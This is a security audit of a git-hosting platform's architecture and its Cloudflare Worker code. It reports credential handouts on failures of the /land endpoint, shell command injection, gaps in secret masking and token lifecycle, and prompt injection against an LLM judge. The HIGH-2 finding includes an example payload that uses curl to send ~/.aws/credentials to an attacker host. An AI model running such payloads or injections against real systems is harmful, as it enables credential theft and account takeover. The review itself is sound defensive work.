# Security review — NextGit architecture spine

Lens: security (platform altitude) · Reviewer: ReviewSecurity · Date: 2026-10-06
Target: `_bmad-output/planning-artifacts/architecture/architecture-cloudflare-git-comp-2026-10-05/ARCHITECTURE-SPINE.md`
Evidence: spine · `platform/CONTRACT.md` · `platform/src/*` (read-only) · `platform/scripts/*` · `/tmp/arch-sweep/{platform,spec}.md` · `docs/judge-layer-ideas.md` · `docs/STATE.md` · `.omp/agents.md`
Method: for each review area, trace attacker-controlled source → broken control/dangerous sink in the deployed code, then judge the spine's coverage. Read-only; no payloads executed, no network calls.

---

## HIGH-1 — `/land` push-failure hands a live write credential to anonymous callers; the spine defers its removal conditionally (AD-9)

**Locations.** Spine AD-9 ("No response ever contains tokens or credentials — including `/land` failure paths (the current push-failure token handout is contract-unratified and must be removed when the judge wave lands)"); spine Consistency Conventions ("no tokens in any response"); spine Open Questions ("`/land` auth gating timing … revisit at first non-demo data").
Code: `platform/src/index.ts:764` mints a repo-scoped write token on **every** `/land` request (`mintWriteToken`, `platform/src/land.ts:99-102`, `TOKEN_TTL_SECONDS = 3600` at `land.ts:22`) with no revocation anywhere (`platform/src`, `platform/scripts` — no revoke call exists, verified). On any push-path error, the catch at `index.ts:784-812` returns the full fold **plus** the token embedded in a ready-to-run command: `git config http.extraheader "Authorization: Bearer ${token}"` (`index.ts:800`). The handout is not in `CONTRACT.md` (73-84 documents only "500 unexpected").

**Scenario.** Anyone on the internet fires two concurrent `POST /land` requests against the same base (or retries until an Artifacts 5xx/timeout/race rejection occurs). Two overlapping folds clone the same base head, both push; the losing push is rejected → 500 → the caller receives a valid base-repo write token for 3600 s, usable for **arbitrary** commits and file contents — bypassing AD-1's single-gated-write-path and AD-7's "control plane owns tokens" (the Worker becomes a credential dispenser). Every failure mints a fresh token; none are revoked. The token also gets persisted into the recipient's clone `.git/config` and shell history beyond its TTL.

**Impact.** Today: marginal on demo-only data (anonymous writes are already possible via `/land` by recorded design), but the credential itself is exactly the class the spine's own rules forbid. The day any non-demo repo shares the `nextgit` namespace, this is unauthenticated write-credential disclosure to the internet — critical.

**Fix (AD-9 amendment).** (1) Strike the conditional grandfather: make the rule unconditional — "no response may contain credentials; no exception; the failure path returns fold artifacts only" — and require deletion of the handout **before** any non-demo data or any redeploy of the path, not "when the judge wave lands". (2) Mechanically: drop `commands`/token from the fallback (the fold is already returned; a caller needing a credential mints via the control plane), or gate the whole fallback behind an explicit `DEMO_PUSH_FALLBACK` env default-off. (3) Revoke (`finally`) any token the Worker mints after push success/failure. (4) Move the Open Question from "timing" to a hard precondition: auth seam lands before first non-demo data.

## HIGH-2 — Command injection into the operator's shell via the fallback `commands[]` (untrusted content interpolated into a shell snippet)

**Locations.** `platform/src/index.ts:803-804`: `printf %s ${JSON.stringify(f.merged ?? "")} > ${JSON.stringify(f.path)}` and `git rm --quiet -- ${JSON.stringify(f.path)}`; message at 806; token at 800. `f.merged` is fold output of agent-authored repo content; `f.path` is an agent-created path (git permits backticks and `$` in names). `JSON.stringify` quotes with `"` but does not escape `$` or backticks — inside POSIX double quotes both execute as command substitution. The code comment (784-786) and the response shape advertise these as "ready-to-run git CLI commands".

**Scenario.** An agent commits content (or a filename) containing `$(curl -d @$HOME/.aws/credentials https://attacker)` or a backtick variant. When the operator (or an automated consumer of `commands[]`) runs the handed-off snippet after any push failure, attacker code executes on the loop host — which holds week-long agent write tokens (`fanout.mjs`) and the wrangler OAuth token scraped from `~/.config/.wrangler/config/default.toml` (`fanout.mjs:26-35`) → escalation to the Cloudflare account.

**Fix.** Remove with HIGH-1. If any command surface survives, never inline untrusted bytes: return a JSON/patch artifact plus content-free commands (`git apply`), or single-quote-escape every interpolated value (`'` → `'\''`). Add an AD-9 line banning shell snippets containing repo content/paths.

## MEDIUM-1 — Auth seam is declared, not enforced; the demo-open boundary has no mechanism (AD-9)

**Locations.** No auth check exists on any route (`/tmp/arch-sweep/platform.md:92`). AD-9's rule ("every state-mutating route is a distinguishable seam that can be gated without reshaping handlers or payloads") specifies no seam artifact: no identity carrier, no chokepoint, no config flag, no default-deny. Reads accept arbitrary repo names; `/land` accepts any `base` matching `[A-Za-z0-9._-]+` (`index.ts:698-723`), so an anonymous caller can fold any existing proposal into **any** repo name in the namespace. "No non-demo data may sit behind an unenforced seam" is policy with no guard that trips; the Open Question's trigger ("first non-demo data") is exactly the condition nobody enforces.

**Scenario.** The first non-demo repo is created in `nextgit` (or a second tenant trial). It is automatically readable (`/changes?repo=…`) and writable (`/land base=<that repo>`) by anyone, because the only boundary is a sentence in a document.

**Fix (AD-9 amendment).** Define the concrete seam: identity = opaque token in a request header (CF Access JWT / Save Point SSO at this seam); one `authorize(request, env, action, {repo|base})` chokepoint called by every route — reads included when the viewership layer lands; `AUTH_MODE` env with **default deny** (demo must set `AUTH_MODE=demo` explicitly). While demo: enforce a repo allowlist (`demo`, `agent-*`) on every `base`/`repos` param, and add edge rate limits on `/land`, `/merge`, `/proposals`, `/judge` (no abuse controls exist today). Note CSRF protections as a requirement for the future cookie-based SSO path, and define the read-side ACL model (org/repo → viewer role) that "viewership" currently only names.

## MEDIUM-2 — AD-4 intent channel: free-text provenance is not masked; the AD's "prevents" list overstates

**Locations.** `platform/src/index.ts:427-428`: `if (intent) for (const f of files) if (!isSecretPath(f.path)) f.intent = intent;` — the notes text is attached to every **non-secret row**; served by `/changes` and `/proposals` (`index.ts:601`) and rendered by the UI. Only secret-class rows lack intent (`CONTRACT.md:104-110`).

**Scenario.** An agent's commit touches `src/app.ts` and its note says `rotate STRIPE_KEY=sk_live_…` (commit messages mention secrets constantly). The value returns in `changeSet.files[].intent` — a response body — although AD-4 lists "intent fields" among the channels it prevents. Path-driven masking cannot cover a commit note: it is not a path.

**Fix (AD-4 amendment).** (1) Re-word "Prevents" to scope the guarantee to secret-class paths. (2) Apply redaction to every free-text channel derived from repo content (intent, notes, error strings) before it enters a body — minimally a `KEY=VALUE`-shaped scrub plus value heuristics; until content scanning lands (`judge-layer-ideas.md` idea 11, currently P1, `/tmp/arch-sweep/spec.md:79`), drop intent whenever the head commit touches a secret-class path. (3) Promote idea 11 into AD-4 as the mandated closure for both intent and non-secret-path values.

## MEDIUM-3 — AD-11 judge: passthrough contradicts versioned question-sets; injection posture is documentation; auto-land vs "humans own irreversible acts"; model pin only logged

**Locations.** `/judge` is not built (`docs/STATE.md:25`). Wiring plan: "`POST /judge` — passthrough `{ state, questions }` → answers" (`docs/judge-layer-ideas.md:93-99`) vs AD-11 "Question sets are versioned in code". Both cannot hold. "Repo content is untrusted DATA, never instructions (injection posture documented)" names no assembly, delimiting, output-validation, or model-verification rule. AD-11 binds "auto-land gate" while also saying "humans own irreversible acts"; "model id pinned and logged" logs but never verifies.

**Scenario (post-build).** A proposal embeds text crafted to bias Clef's `noul`/`score` answers; with idea B5's judge-confidence auto-land, the biased verdict authorizes an irreversible write no human reviewed. Under passthrough, an anonymous caller supplies state **and** questions — a free inference oracle on the account's Workers AI quota (denial-of-wallet) and a footgun for any internal caller that trusts caller-supplied judgments.

**Fix (AD-11 amendment).** Request shape = `{ setId, target {base, repos, refs} }`; state assembled server-side by one module that delimits/labels untrusted content and strips instruction-like text per a tested policy; caller-supplied `state`/`questions` prohibited regardless of auth. Validate responses against the typed schema (kind whitelist, ranges); reject unknown fields. `response.model !== PINNED_ID` ⇒ judge-unavailable ⇒ fail closed. Auto-land requires ≥1 non-model corroborating signal (fold status / conflict map) and stays off until an injection-testing spike passes on the labeled set. Add per-caller budget + rate cap for `/judge`.

## MEDIUM-4 — AD-7 token lifecycle contract missing (mint/revoke/storage/audit/least-privilege)

**Locations.** Worker mints a 3600 s token per `/land` and never revokes (`index.ts:764`; no revoke call in `platform/src|scripts`). `platform/scripts/fanout.mjs:57-70` mints **7-day** write tokens (default `ttl = 604800`) and writes them to a predictable, default-permissive path `/tmp/nextgit-agents.json` that outlives the run. Scripts authenticate with either `CLOUDFLARE_API_TOKEN` or the **wrangler OAuth token** scraped from `~/.config/.wrangler/config/default.toml` (`fanout.mjs:26-35`) — an account-wide credential consumed by demo utilities.

**Scenario.** Loop-host compromise (or another local user reading `/tmp`) yields week-long repo write tokens plus a possible account-wide OAuth token; no rotation, revocation, or audit trail exists to bound or detect the loss. Token sprawl: repeated `/land` calls accumulate live tokens (each failure also mints one — HIGH-1).

**Fix (AD-7 amendment).** Add a token-lifecycle contract: scope ⊆ single repo + write; TTL bounds per principal class (worker-minted ≤ minutes, agent ≤ hours); single-purpose; revoke-after-use for worker-minted tokens; revocation on fork teardown/rotation; storage mode 0600 outside repos/transcripts; values never in logs, argv, or transcripts (lift `.omp/agents.md:9` into the spine); control-plane auth via an account-scoped API token limited to Artifacts permissions (not the wrangler OAuth file); audit events for mint/use/revoke.

## LOW-1 — AD-4 path-class list gaps

`isSecretPath` (`index.ts:219-225`) matches the CONTRACT list exactly — the list itself is the weak part: `id_rsa`, `.netrc`, `.npmrc`, `credentials` (no `.json`, e.g. `.aws/credentials`), `*.p8/*.jks/*.keystore`, `*.token`, case variants (`.ENV`, `X.KEY`), and `secrets-old/` are unmasked, so such files get full inline patches. Accepted path-driven policy, but widen the class list (additive CONTRACT bump) and lean on the content scan from MEDIUM-2.

## LOW-2 — Event/queue trust boundary: unvalidated payload fields copied into KV

Queue consumer (`index.ts:868-895`) copies `type`, `repo` (from `event.source.repoName`), `ref`, `after` into KV verbatim and logs them. UI escapes every interpolation (`escapeHtml`, `app.js:61-69, 311-312`), so no XSS today, but repo/ref strings are agent-influenced (ref names may carry HTML/shell metacharacters) and `/events` consumers cannot distinguish validated from raw. AD-6 amendment: validate/normalize at the consumer (type whitelist; repo `[A-Za-z0-9._-]`; ref charset; sha hex) and state that the feed is a hint, never authority for writes or identity.

## LOW-3 — Operational envelope: unpinned deploy tool contradicts the pinned stack

Spine line 177: `npx wrangler@latest deploy`, while the Stack table pins wrangler `^4.147.0`. `@latest` executes whatever version is current with full account credentials on the loop host (supply-chain + reproducibility). Fix: standardize on the lockfile-pinned local wrangler; also pin the rule that observability logs never include Authorization headers or request bodies (today only event metadata is logged at `index.ts:875-883` — keep it that way).

---

## Verified controls (checked, not findings)

- Secret-class suppression is implemented as specified: no patch for secret rows (`index.ts:476-477`), no texts into merge inputs (461-462), fold marks `withheld-secret` (353-360), `/land` 409s (735-741); `keys[]` extraction never returns values.
- `isSecretPath` matches CONTRACT exactly; repo/ref names validated at `/land` (`index.ts:698-723`); no SSRF — clone/push remotes come from the binding (`baseRepo.info()`), never from request input; githttp injects the token only to binding-derived remotes (`githttp.ts:87`).
- UI escapes all interpolations of server data (`app.js:61-69`); the push-failed `commands[]` are not rendered by the UI (only a generic error banner is), so HIGH-2 requires a human/harness consuming the API response or copy-pasting.
- `wrangler.jsonc` carries no secrets; worker logs carry only event metadata.
- The demo-open posture itself is deliberate and recorded (spine Open Questions; STATE.md); the problems flagged are the **removal condition** and the **missing enforcement mechanics**, not the recorded posture.

## Coverage summary

AD-9 (auth seam, token handout, demo-open, SSO shape, viewership claims) — HIGH-1, HIGH-2, MEDIUM-1.
AD-4 (masking completeness: patches, merged text, conflict text, intent) — MEDIUM-2, LOW-1; patches/merged/conflict verified sound for secret-class paths.
AD-11 (judge injection, /judge passthrough, model-id pinning, auto-land) — MEDIUM-3.
AD-7 (token minting, storage, revocation, logging) — MEDIUM-4 (plus HIGH-1).
Event/queue trust boundary — LOW-2.
Operational envelope (secrets in configs/logs, wrangler token usage) — LOW-3 (plus MEDIUM-4 storage/credential findings).

Verdict: **FAIL** — 2 HIGH, 4 MEDIUM; the two HIGHs are live in the deployed worker and are contingent on AD text that currently grandfathers or omits them.
